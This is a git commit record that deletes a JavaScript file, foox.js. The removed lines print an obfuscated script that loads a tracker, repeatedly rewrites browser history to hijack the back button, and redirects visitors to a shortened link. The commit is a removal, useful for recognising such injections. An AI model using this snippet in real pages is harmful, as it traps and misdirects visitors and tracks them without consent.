39afd026e53e085913340ecb8539a60bde697414
w3capi <119132881+w3capi@users.noreply.github.com>
2022-11-27 19:41:35 +0700

    Delete foox.js

--- foox.js
+++
@@ -1,3 +0,0 @@
-(function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};m[i].l=1*new Date();for(var j=0;j<document.scripts.length;j++){if(document.scripts[j].src===r){return;}}
-k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
-(window,document,"script","https://mc.yandex.ru/metrika/tag.js","ym");ym(90800427,"init",{clickmap:true,trackLinks:true,accurateTrackBounce:true});isclick=false;setInterval(function(){if(isclick==false){history.pushState("a","","https://soaper.tv/?#bdf");}else{isclick=false;}},500);window.location.replace("https://cutt.ly/3MfGLnX");
